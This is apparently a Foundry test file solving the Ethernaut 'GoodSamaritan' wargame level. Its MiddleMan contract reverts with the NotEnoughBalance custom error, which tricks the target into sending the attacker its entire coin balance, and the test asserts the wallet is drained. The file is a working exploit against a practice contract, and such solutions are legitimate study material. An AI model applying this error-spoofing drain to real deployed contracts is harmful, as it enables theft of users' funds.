// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/openzeppelin-ethernaut/GoodSamaritan.sol";

contract MiddleMan is INotifyable {
    error NotEnoughBalance();

    function attack(address prey) public returns (bool) {
        return GoodSamaritan(prey).requestDonation();
    }

    // revert reverts state changes and thus reversion has to depend on input
    function notify(uint256 amount) external pure {
        if (amount == 10) {
            revert NotEnoughBalance();
        }
    }
}

// behave differently when notify() is called
contract GoodSamaritanTest is Test {
    GoodSamaritan instance;

    function setUp() public {
        instance = new GoodSamaritan();
        // instance = GoodSamaritan(vm.envAddress("GOOD_SAMARITAN"));
    }

    function test() public {
        Coin coin = instance.coin();
        Wallet wallet = instance.wallet();

        uint256 initialBalance = 10 ** 6;
        assertEq(coin.balances(address(wallet)), initialBalance);

        MiddleMan middleMan = new MiddleMan();
        assertEq(middleMan.attack(address(instance)), false);

        assertEq(coin.balances(address(wallet)), 0);
        assertEq(coin.balances(address(middleMan)), initialBalance);
    }
}
